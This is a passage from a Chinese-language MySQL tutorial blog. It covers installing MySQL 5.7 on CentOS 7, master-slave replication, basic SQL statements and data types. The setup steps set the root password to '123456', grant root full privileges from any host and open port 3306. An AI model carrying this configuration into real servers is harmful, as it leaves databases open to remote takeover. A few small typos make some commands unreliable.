class="line">#0-表名存储为给定的大小和比较是区分大小写的（unix默认）；1-表名存储在磁盘是小写的，但是比较的时候是不区分大小写（windows默认）；2-表名存储为给定的大小写但是比较的时候是小写的（macOS默认）</span><br><span class="line">lower_case_table_names=1</span><br><span class="line"></span><br><span class="line">#最大连接数（范围：1-100000，默认151）</span><br><span class="line">max_connections=151</span><br></pre></td></tr></table></figure>

<ul>
<li>解压安装，把安装包mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz上传到centos7的root用户的根目录，依次执行：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">groupadd mysql</span><br><span class="line">useradd -r -g mysql mysql</span><br><span class="line">tar -zxvf mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz -C /usr/local/</span><br><span class="line">mv /usr/local/mysql-5.7.38-linux-glibc2.12-x86_64/ /usr/local/mysql</span><br><span class="line">cd /usr/local/mysql</span><br><span class="line">mkdir data tmp</span><br><span class="line">chown mysql:mysql data tmp</span><br><span class="line">chmod 750 data</span><br><span class="line">./bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data</span><br><span class="line">./bin/mysql_ssl_rsa_setup --datadir=/usr/local/mysql/data --verbose</span><br><span class="line">./bin/mysqld_safe --user=mysql &amp;</span><br></pre></td></tr></table></figure>

<ul>
<li>在上一步使用 <code>mysqld</code> 进行初始化后，会生成root默认密码，记录下来（首次登录使用），打开新窗口切换到mysql根目录，执行以下命令进行登录：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/local/mysql</span><br><span class="line">./bin/mysql -uroot -p</span><br></pre></td></tr></table></figure>

<p>​	登录后修改root用户密码，并开启远程服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#也可通过SET PASSWORD FOR &#x27;root&#x27;@&#x27;localhost&#x27; = PASSWORD(&#x27;123456&#x27;);来修改密码</span><br><span class="line">set password=password(&#x27;123456&#x27;);</span><br><span class="line">USE mysql;</span><br><span class="line">UPDATE user SET host=&#x27;%&#x27; WHERE user=&#x27;root&#x27;;</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; WITH GRANT OPTION;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>

<ul>
<li>退出登录，修改 <code>/usr/local/mysql</code>整个目录及其下文件、文件夹的属组和属主为mysql组和mysql用户</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown -R mysql:mysql /usr/local/mysql</span><br></pre></td></tr></table></figure>

<ul>
<li>自启动配置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysql</span><br><span class="line">chmod +x /etc/init.d/mysql</span><br><span class="line">chkconfig --add mysql</span><br><span class="line">chkconfig mysql on</span><br></pre></td></tr></table></figure>

<ul>
<li>启动命令(start&#x2F;stop&#x2F;restart&#x2F;status)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#这里以重启命令为例，开启、停止、查看状态也类似</span><br><span class="line">service mysql restart</span><br><span class="line">或</span><br><span class="line">systemctl restart mysql</span><br></pre></td></tr></table></figure>

<ul>
<li>把bin目录加到PATH，修改 <code>/etc/profile</code> ，在最下面添加：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export MYSQL_HOME=/usr/local/mysql</span><br><span class="line">export PATH=$PATH:$MYSQL_HOME/bin</span><br></pre></td></tr></table></figure>

<p>​	重新加载 <code>/etc/profiles</code> 配置，并查看mysql版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source /etc/profiles</span><br><span class="line">mysqld -V</span><br></pre></td></tr></table></figure>

<ul>
<li>开放3306端口</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=3306/tcp --permanent &amp;&amp; firewall-cmd --reload &amp;&amp; firewall-cmd --list-ports</span><br></pre></td></tr></table></figure>

<h2 id="1-3-主从复制-centos7"><a href="#1-3-主从复制-centos7" class="headerlink" title="1.3 主从复制(centos7)"></a>1.3 主从复制(centos7)</h2><h3 id="1-3-1-概要说明"><a href="#1-3-1-概要说明" class="headerlink" title="1.3.1 概要说明"></a>1.3.1 概要说明</h3><p>说明：基于1.2的步骤配置好mysql，这里采取一主一从，每个slave只能有一个master，每个slave只能有一个server-id（所有主、从机的服务器id均不相同），master可以有多个slave，且主从的网络需互通，均在centos7搭建，在做主从前需要确保数据的一致。</p>
<p>原理：slave从master读取binlog来同步数据</p>
<p>过程：</p>
<p>①master将改变的记录写到二进制日志(binary log)，这个过程称为二进制日志事件(binary log events);</p>
<p>②slave将master的binary log events拷贝到它的中继日志(relay log);（I&#x2F;O thread）</p>
<p>③slave重做中继日志的事件，将改变应用到自己的数据库中。MySQL主从复制时异步串行的。（SQL thread）</p>
<h3 id="1-3-2-主机配置"><a href="#1-3-2-主机配置" class="headerlink" title="1.3.2 主机配置"></a>1.3.2 主机配置</h3><p>在my.cnf的[mysqld]下增加配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#服务器id，默认为1，不能重复</span><br><span class="line">server-id=1</span><br><span class="line"></span><br><span class="line">#启动二进制日志，会在mysql/data/目录下创建mysql-bin.&#123;number&#125;文件保存二进制日志</span><br><span class="line">log-bin=mysql-bin</span><br><span class="line"></span><br><span class="line">#binlog格式(STATEMENT|ROW|MIXED)</span><br><span class="line">binlog_format=ROW</span><br><span class="line"></span><br><span class="line">#启用错误日志，会在mysql/data/目录下创建mysql-error.err文件保存错误日志，不设置默认保存在$HOSTNAME.err下</span><br><span class="line">log-error=mysql-error</span><br><span class="line"></span><br><span class="line">#主机，0-可读写，1-只读（从库设置不影响同步，也不影响超级用户读写）</span><br><span class="line">read-only=0</span><br><span class="line"></span><br><span class="line">#设置不要复制的数据库</span><br><span class="line">binlog-ignore-db=mysql</span><br><span class="line"></span><br><span class="line">#设置需要复制的数据库，不设置则同步除binlog-ignore-db配置外的所有数据库。配置多个用逗号隔开</span><br><span class="line">#binlog-do-db=需要复制的数据库的名字</span><br></pre></td></tr></table></figure>

<h3 id="1-3-3-从机配置"><a href="#1-3-3-从机配置" class="headerlink" title="1.3.3 从机配置"></a>1.3.3 从机配置</h3><p>在my.cnf的[mysqld]下增加配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#服务器id，默认为1，不能重复</span><br><span class="line">server-id=2</span><br><span class="line"></span><br><span class="line">#启动二进制日志，会在mysql/data/目录下创建mysql-bin.&#123;number&#125;文件保存二进制日志</span><br><span class="line">log-bin=mysql-bin</span><br><span class="line"></span><br><span class="line">#binlog格式(STATEMENT|ROW|MIXED)</span><br><span class="line">binlog_format=ROW</span><br><span class="line"></span><br><span class="line">#主机，0-可读写，1-只读（从库设置不影响同步，也不影响超级用户读写）</span><br><span class="line">read-only=1</span><br></pre></td></tr></table></figure>

<h3 id="1-3-4-主从关系配置"><a href="#1-3-4-主从关系配置" class="headerlink" title="1.3.4 主从关系配置"></a>1.3.4 主从关系配置</h3><ul>
<li>分别重启主从服务器的MySQL服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart mysql</span><br></pre></td></tr></table></figure>

<ul>
<li>主机创建账号，并授权slave，在主机mysql中执行：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT REPLICATION SLAVE ON *.* TO &#x27;提供给从机使用的账号&#x27;@&#x27;从机数据库IP&#x27; IDENTIFIED BY &#x27;提供给从机使用的账号的密码&#x27;;</span><br><span class="line"></span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line">#查看主机状态，包括从哪个文件(File)复制以及复制的起点(Position)，执行完后，不要再有主机写入操作，防止状态值改变</span><br><span class="line">SHOW MASTER STATUS;</span><br></pre></td></tr></table></figure>

<ul>
<li>从机配置需要复制的主机，在从机mysql中执行：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CHANGE MASTER TO MASTER_HOST=&#x27;主机ip&#x27;,MASTER_USER=&#x27;提供给从机使用的账号&#x27;,MASTER_PASSWORD=&#x27;提供给从机使用的账号的密码&#x27;,MASTER_LOG_FILE=&#x27;File名字&#x27;,MASTER_LOG_POS=Position数字;</span><br><span class="line"></span><br><span class="line">#启动从服务器的复制功能</span><br><span class="line">START SLAVE;</span><br><span class="line"></span><br><span class="line">#查看从服务器状态，其中Slave_IO_Running:Yes和Slave_SQL_Running:Yes表示主从配置成功。如果失败，先停了slave(STOP SLAVE指令)，重新查看主机状态（File/Position），再配置从机</span><br><span class="line">SHOW SLAVE STATUS\G</span><br><span class="line"></span><br><span class="line">#停止slave</span><br><span class="line">STOP SLAVE;</span><br></pre></td></tr></table></figure>

<ul>
<li>分别测试：主机新建库、新建表、插入数据、删除数据，查看从机数据</li>
</ul>
<p>注意：假如从机的整个数据库安装目录是从主机复制而来，那么data&#x2F;auto.cnf中的uuid是相同的，需要把从机上的这个文件删除，再重启数据库，让它自动生成。</p>
<h1 id="2-四种SQL语言"><a href="#2-四种SQL语言" class="headerlink" title="2. 四种SQL语言"></a>2. 四种SQL语言</h1><p>注：数据库名称、表名称、字段名称、索引名称都可以使用&#96;&#96;符号来包裹住，特别是名称是关键字的时候，必须加上，其它情况可不加。</p>
<h2 id="2-1-DDL-数据定义语言"><a href="#2-1-DDL-数据定义语言" class="headerlink" title="2.1 DDL(数据定义语言)"></a>2.1 DDL(数据定义语言)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常见关键字：SHOW/CREATE/ALTER/USE/DESC/DROP/TRUNCATE/COMMENT/RENAME </span><br></pre></td></tr></table></figure>

<ul>
<li>普通建表语句</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE t_xxx(</span><br><span class="line">    `id` INT(11) NOT NULL PRIMARY KEY AUTO_INCREMENT,</span><br><span class="line">    `name` VARCHAR(50),</span><br><span class="line">    `key` CHAR(10),</span><br><span class="line">    `age` TINYINT(3)</span><br><span class="line">) ENGINE=INNODB DEFAULT CHARSET=UTF8;</span><br></pre></td></tr></table></figure>

<ul>
<li>操作表空间</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW TABLES;</span><br><span class="line">SHOW CREATE TABLE xxx;</span><br><span class="line">DESC xxx;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>添加字段</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 添加一个字段</span><br><span class="line">ALTER TABLE t_xxx ADD COLUMN sex CHAR(1) NOT NULL DEFAULT &#x27;男&#x27;;</span><br><span class="line"></span><br><span class="line"># 添加多个字段</span><br><span class="line">ALTER TABLE t_xxx ADD(</span><br><span class="line">    hobby VARCHAR(30) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">    school VARCHAR(30) NOT NULL DEFAULT &#x27;&#x27;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li>修改列类型</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE t_xxx MODIFY school VARCHAR(100);</span><br></pre></td></tr></table></figure>

<ul>
<li>修改列类型以及列名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE t_xxx CHANGE hobby favorite VARCHAR(50);</span><br></pre></td></tr></table></figure>

<ul>
<li>修改表名称</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE t_xxx RENAME TO t_xx;</span><br></pre></td></tr></table></figure>

<ul>
<li>删除列</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE t_xx DROP school;</span><br></pre></td></tr></table></figure>

<ul>
<li>删除表</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE t_xx;</span><br></pre></td></tr></table></figure>

<ul>
<li>删除数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP DATABASE xxx;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-DML-数据操作语言"><a href="#2-2-DML-数据操作语言" class="headerlink" title="2.2 DML(数据操作语言)"></a>2.2 DML(数据操作语言)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常见关键字：INSERT/DELETE/UPDATE</span><br></pre></td></tr></table></figure>

<p>（1）INSERT</p>
<ul>
<li>插入一条表记录(给出列名)：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO stu (</span><br><span class="line">number, name, age, gender</span><br><span class="line">) VALUES (</span><br><span class="line">&#x27;HE_0001&#x27;, &#x27;LiSi&#x27;, 20, &#x27;male&#x27;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li>插入一条表记录(不给出列名), 按照创建列时的顺序赋值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO stu VALUES (</span><br><span class="line">&#x27;HE_0002&#x27;, &#x27;ZhangSan&#x27;, 19, &#x27;female&#x27;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>（2）UPDATE</p>
<ul>
<li>修改所有sex的值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE t_student SET sex=&#x27;female&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>按单条件修改修改字段值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE t_student SET sex=&#x27;male&#x27; WHERE sname=&#x27;ZhaoLiu&#x27;;</span><br></pre></td></tr></table></figure>

<ul>
<li>按多条件修改修改字段值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE t_student SET sex=&#x27;girl&#x27; WHERE sname in(&#x27;ZhangSan&#x27;, &#x27;LiSi&#x27;);</span><br></pre></td></tr></table></figure>

<p>（3）DELETE</p>
<ul>
<li>删除特定记录</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM stu WHERE gender is NULL;</span><br></pre></td></tr></table></figure>

<ul>
<li>删除所有记录</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM stu;</span><br></pre></td></tr></table></figure>

<h2 id="2-3-DCL-数据控制语言"><a href="#2-3-DCL-数据控制语言" class="headerlink" title="2.3 DCL(数据控制语言)"></a>2.3 DCL(数据控制语言)</h2><p>注意：授权与撤销授权后，需要重新登录或者执行 FLUSH PRIVILEGES; 才生效</p>
<p>（1）创建用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE USER &#x27;HE&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;123&#x27;;</span><br><span class="line"></span><br><span class="line">注意：如果希望用户可以远程访问，则把localhost改成通配符%</span><br></pre></td></tr></table></figure>

<p>（2）创建数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE test DEFAULT CHARACTER SET &#x27;utf8&#x27;;</span><br></pre></td></tr></table></figure>

<p>（3）授权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT ALL [PRIVILEGES] ON *.* TO &#x27;HE&#x27;@&#x27;localhost&#x27; [IDENTIFIED BY &#x27;123456&#x27;] [WITH GRANT OPTION];</span><br><span class="line"></span><br><span class="line">具体说明：</span><br><span class="line">1. ALL PRIVILEGES中的PRIVILEGES是可选的，ALL与ALL PRIVILEGES等效</span><br><span class="line">2. ALL可以替换为SELECT，INSERT，UPDATE等</span><br><span class="line">3. *.* 表示 全部库.全部表</span><br><span class="line">4. TO后面的 &#x27;用户名&#x27;@&#x27;访问者主机名&#x27; 与创建用户的含义一样</span><br><span class="line">5. IDENTIFIED BY &#x27;123456&#x27; 指定远程访问的密码，不指定则为用户创建时的密码</span><br><span class="line">6. WITH GRANT OPTION 表示授予该用户授权的权限，就是可以修改别的用户的权限</span><br><span class="line"></span><br><span class="line">注意：假如当前没用该用户，但给予授权且不设置密码，则会默认使用上一次的授权密码，尽可能先创建用户后授权使用，尽可能不要在授权时指定密码，避免产生过多麻烦，不要直接通过授权的方式创建用户</span><br></pre></td></tr></table></figure>

<p>（4）查看权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW GRANTS FOR &#x27;HE&#x27;@&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>

<p>（5）撤销权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REVOKE ALL ON *.* FROM &#x27;HE&#x27;@&#x27;localhost&#x27;;</span><br><span class="line"></span><br><span class="line"># 如果当前数据库作为从库使用，也就是希望从库只读，在打开只读模式的前提下，需要撤销普通用户的SUPER权限。如果是mysql8.0.18+版本，还要撤销CONNECTION_ADMIN权限</span><br><span class="line">REVOKE SUPER ON *.* FROM &#x27;HE&#x27;@&#x27;%&#x27;;</span><br><span class="line"></span><br><span class="line">注意：假如授权时是针对*.*，但是撤销时指定数据库名或表名，会提示没有此项授权，也就是无法撤销授权，具体可通过查看授权后，对项授权进行撤销。同理，授权时指定特定的数据库或表，撤销授权时通过通配符的形式指定，也是无法撤销授权，提示如下</span><br><span class="line">1141 - There is no such grant defined for user &#x27;HE&#x27; on host &#x27;%&#x27;</span><br></pre></td></tr></table></figure>

<p>（6）删除用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP USER &#x27;HE&#x27;@&#x27;localhost&#x27;;</span><br><span class="line"></span><br><span class="line">注意：在删除用户前，需把授权先撤销后再进行删除</span><br></pre></td></tr></table></figure>

<h2 id="2-4-DQL-数据查询语言"><a href="#2-4-DQL-数据查询语言" class="headerlink" title="2.4 DQL(数据查询语言)"></a>2.4 DQL(数据查询语言)</h2><p>（1）查询去除重复行记录(DISTINCT)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT DISTINCT deptno FROM emp;</span><br></pre></td></tr></table></figure>

<p>（2）列运算(IFNULL函数，如果要替换成字符串要加’’)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT *,sal+IFNULL(COMM, 0) FROM emp;</span><br></pre></td></tr></table></figure>

<p>（3）连接(CONCAT函数)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT CONCAT(&#x27;员工号：&#x27;, empno, &#x27;员工名字：&#x27;, ename) FROM emp;</span><br></pre></td></tr></table></figure>

<p>（4）别名(as可以省略)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT CONCAT(empno, ename) as &#x27;信息&#x27; FROM emp;</span><br></pre></td></tr></table></figure>

<p>（5）模糊查询(关键字LIKE “张_” ，一个下划线占用一个字符，表示张x，%代表0到多个字符)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM emp WHERE ename LIKE &#x27;张_&#x27;;</span><br><span class="line">SELECT * FROM stu WHERE sname LIKE &#x27;%刚&#x27;;</span><br><span class="line">SELECT * FROM stu WHERE sname LIKE &#x27;%小%&#x27;;</span><br></pre></td></tr></table></figure>

<p>（6）排序(关键字ORDER BY，默认升序，升序：ASC, 降序：DESC)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM emp WHERE ename LIKE &#x27;___&#x27; ORDER BY sal ASC;</span><br><span class="line">SELECT * FROM emp ORDER BY sal ASC, COMM DESC, empno ASC;</span><br></pre></td></tr></table></figure>

<p>（7）聚合函数（ COUNT(sal)表示sal不为NUL才算有效行 ）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT COUNT(*) &#x27;人数&#x27;, SUM(sal) &#x27;总和&#x27;, MAX(sal) &#x27;最高工资&#x27;, MIN(sal) &#x27;最低工资&#x27;, AVG(sal) &#x27;平均工资&#x27; FROM emp;</span><br></pre></td></tr></table></figure>

<p>（8）分组查询(GROUP BY 查询分组的信息外，尽量查询聚合函数信息，别查询非分组信息)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT job, COUNT(*) FROM emp GROUP BY job;</span><br><span class="line"></span><br><span class="line">SELECT job &#x27;工作类型&#x27;, COUNT(*) &#x27;人数&#x27;, SUM(sal) &#x27;工资总和&#x27;, MAX(sal) &#x27;最高工资&#x27;, MIN(sal) &#x27;最低工资&#x27;, AVG(sal) &#x27;平均工资&#x27; FROM emp GROUP BY job;</span><br></pre></td></tr></table></figure>

<ul>
<li>以部门分组，查找工资大于等于15000人数且分组后人数大于等于3的组</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT deptno, COUNT(*) FROM emp WHERE sal &gt;= 15000 GROUP BY deptno HAVING COUNT(*) &gt;= 3;</span><br></pre></td></tr></table></figure>

<p>（9）关键字LIMIT(只有mysql有)</p>
<ul>
<li>从第5+1行开始查，意思是下标为5，第六行开始查，查3条记录，如果不够3条，那么有多少查多少</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM emp LIMIT 5，3;</span><br></pre></td></tr></table></figure>

<ul>
<li>从第M+1条开始查找，查找N条记录，剩余不够N条，有多少查多少</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM emp LIMIT M, N; </span><br></pre></td></tr></table></figure>

<ul>
<li>如果说一页可以显示8条记录，那么查找第4页, 第一个数求法：(4-1)*8&#x3D;24	0-7 8-15 16-23 24-31</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t_xxx LIMIT 24, 8;</span><br></pre></td></tr></table></figure>

<h1 id="3-数据类型"><a href="#3-数据类型" class="headerlink" title="3. 数据类型"></a>3. 数据类型</h1><h2 id="3-1-字符串类型"><a href="#3-1-字符串类型" class="headerlink" title="3.1. 字符串类型"></a>3.1. 字符串类型</h2><ul>
<li>mysql行大小最大为65535个字节，utf8编码一个字符占用3个字节，Latin编码占用1个字节，GBK占用2个字节</li>
</ul>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>CHAR[(M)]</td>
<td>固定长度的字符串，在存储时总是用空格右填充到指定长度。M表示以字符为单位的列长度。如果省略M，则长度为1。M范围0-255，占用字节数：M*每个字符占用的字节数</td>
</tr>
<tr>
<td>VARCHAR(M)</td>
<td>一个变长字符串，M表示以字符为单位的最大列长度。M范围0-65535，占用字节数：实际字符数*每个字符占用的字节数。VARCHAR的最大有效长度受行大小(65535字节，在所有列之间共享)和使用的字符集的影响。由于行存储从第二个字节开始，并且需要一个字节记录字符串长度(如果超过255字节则需要两个字节)，因此最大只能到65532字节。示例：utf8编码前提下，M最大为(65535-1-2)&#x2F;3&#x3D;21844</td>
</tr>
<tr>
<td>BINARY[(M)]</td>
<td>BINARY类型类似于CHAR类型，但存储二进制字节字符串而不是非二进制字符串。可选长度M表示以字节为单位的列长度。如果省略，M默认为1。</td>
</tr>
<tr>
<td>VARBINARY(M)</td>
<td>VARBINARY类型类似于VARCHAR类型，但是存储二进制字节字符串而不是非二进制字符串。M表示以字节为单位的最大列长度。</td>
</tr>
<tr>
<td>TINYBLOB</td>
<td>BLOB列，最大长度为255(2^8−1)字节。每个TINYBLOB值都使用一个1字节长度的前缀存储，该前缀表示值中的字节数。</td>
</tr>
<tr>
<td>BLOB[(M)]</td>
<td>BLOB列，最大长度为65535(2^16−1)字节。每个BLOB值都使用一个2字节长度的前缀存储，该前缀表示值中的字节数。可以为该类型指定一个可选长度M。如果这样做了，MySQL将创建一个最小的BLOB类型，其大小足以容纳M字节的值。</td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>BLOB列，最大长度为16777215(2^24−1)字节。每个MEDIUMBLOB值都使用一个3字节长度的前缀存储，该前缀表示值中的字节数。</td>
</tr>
<tr>
<td>LONGLOB</td>
<td>BLOB列，最大长度为4294967295或4GB(2^32−1)字节。LONGBLOB列的有效最大长度取决于客户机&#x2F;服务器协议中配置的最大数据包大小和可用内存。每个LONGBLOB值都使用一个4字节长度前缀存储，该前缀表示值中的字节数。</td>
</tr>
<tr>
<td>TINYTEXT</td>
<td>TEXT列，最大长度为255(2^8−1)个字符。如果值包含多字节字符，则有效最大长度会偏小。每个TINYTEXT值都使用一个1字节长度的前缀存储，该前缀表示值中的字节数。</td>
</tr>
<tr>
<td>TEXT[(M)]</td>
<td>TEXT列，最大长度为65535(2^16−1)个字符。如果值包含多字节字符，则有效最大长度会偏小。每个TEXT值都使用一个2字节长度前缀存储，该前缀表示值中的字节数。可以为该类型指定一个可选长度M。如果这样做了，MySQL创建的列是最小的TEXT类型，足够容纳M个字符的值。</td>
</tr>
<tr>
<td>MEDIUMTEXT</td>
<td>TEXT列，最大长度为16777215(2^24−1)个字符。如果值包含多字节字符，则有效最大长度会偏小。每个MEDIUMTEXT值都使用一个3字节长度的前缀存储，该前缀表示值中的字节数。</td>
</tr>
<tr>
<td>LONGTEXT</td>
<td>TEXT列，最大长度为4294967295或4GB(2^32−1)个字符。如果值包含多字节字符，则有效最大长度会偏小。LONGTEXT列的有效最大长度还取决于客户机&#x2F;服务器协议中配置的最大数据包大小和可用内存。每个LONGTEXT值都使用一个4字节长度前缀存储，该前缀表示值中的字节数。</td>
</tr>
<tr>
<td>ENUM(‘value1’,’value2’,…)</td>
<td>枚举，一个只能有一个值的字符串对象，从值’value1’，’value2’，…，NULL或特殊的“错误值”。ENUM值在内部表示为整数。</td>
</tr>
<tr>
<td>SET(‘value1’,’value2’,…)</td>
<td>集合，一个可以有0个或多个值的字符串对象，每个值都必须从值’value1’， ‘value2’，…中选择，SET值在内部表示为整数。一个SET列最多可以有64个不同的成员。一个表作为一个组，其ENUM和SET列之间的唯一元素列表定义不能超过255个。</td>
</tr>
</tbody></table>
<h2 id="3-2-整数类型"><a href="#3-2-整数类型" class="headerlink" title="3.2. 整数类型"></a>3.2. 整数类型</h2><table>
<thead>
<tr>
<th>数据类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>BIT[(M)]</td>
<td>位值类型。M表示每个值的位数，从 1 到 64。如果省略M，则默认值为 1</td>
</tr>
<tr>
<td>BOOLEAN（或BOOL）</td>
<td>布尔标志，mysql会将其转为TINYINT(1)，因此和TINYINT的占用空间取值范围相同，0-false，非0-true</td>
</tr>
<tr>
<td>TINYINT[(M)] [UNSIGNED] [ZEROFILL]</td>
<td>1个字节，范围-128-127 ，如果是UNSIGNED，则为0-255</td>
</tr>
<tr>
<td>SMALLINT[(M)] [UNSIGNED] [ZEROFILL]</td>
<td>2个字节，范围-32768-32767 ，如果是UNSIGNED，则为0-65535</td>
</tr>
<tr>
<td>MEDIUMINT[(M)] [UNSIGNED] [ZEROFILL]</td>
<td>3个字节，范围-8388608-8388607，如果是UNSIGNED，则为0-16777215</td>
</tr>
<tr>
<td>INT[(M)] [UNSIGNED] [ZEROFILL]（或INTEGER）</td>
<td>4个字节，范围-2147483648-2147483647，如果是UNSIGNED， 则为0-4294967295</td>
</tr>
<tr>
<td>BIGINT[(M)] [UNSIGNED] [ZEROFILL]</td>
<td>8个字节，范围-2^63-2^63-1，如果是UNSIGNED，则为0-2^64-1</td>
</tr>
</tbody></table>
<p>注意：int(6)这里的6代表显示宽度，在字段设置了ZEROFILL的前提下（不设置不会有如下效果），如果字段长度不足6位，则高位补0，如果超出6位，但没超出4个字节长度（2^32-1）,则会显示实际数据。通常使用int(11)，因为int的最多长度为10位，因此通常用11。</p>
<h2 id="3-3-浮点数类型"><a href="#3-3-浮点数类型" class="headerlink" title="3.3. 浮点数类型"></a>3.3. 浮点数类型</h2><table>
<thead>
<tr>
<th>数据类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>FLOAT(m,d)</td>
<td>单精度浮点型，8位精度，4个字节，m数字总位数（不包括小数点），d小数位</td>
</tr>
<tr>
<td>DOUBLE(m,d)</td>
<td>双精度浮点型，16位精度，8个字节，m数字总位数（不包括小数点），d小数位</td>
</tr>
<tr>
<td>DECIMAL(m,d)（或DEC或NUMERIC）</td>
<td>精度可变的浮点值，m数字总位数（不包括小数点），d小数位，m范围1-65（默认10），d范围0-30（默认0，且不大于m）</td>
</tr>
<tr>
<td>REAL</td>
<td>4个字节的浮点值</td>
</tr>
</tbody></table>
<ul>
<li>decimal占用空间范围对照表，把小数点左右边数字分开计算，每九位占用4个字节，不足九位，按下表计算，摘自：<a href="https://dev.mysql.com/doc/refman/5.6/en/precision-math-decimal-characteristics.html">MySQL :: MySQL 5.6 Reference Manual :: 12.21.2 DECIMAL Data Type Characteristics</a></li>
</ul>
<table>
<thead>
<tr>
<th>剩余数字</th>
<th>字节数</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>1-2</td>
<td>1</td>
</tr>
<tr>
<td>3-4</td>
<td>2</td>
</tr>
<tr>
<td>5-6</td>
<td>3</td>
</tr>
<tr>
<td>7-9</td>
<td>4</td>
</tr>
</tbody></table>
<h2 id="3-4-日期和时间数据类型"><a href="#3-4-日期和时间数据类型" class="headerlink" title="3.4. 日期和时间数据类型"></a>3.4. 日期和时间数据类型</h2><table>
<thead>
<tr>
<th>数据类型</th>
<th>范围</th>
<th>格式</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>DATE</td>
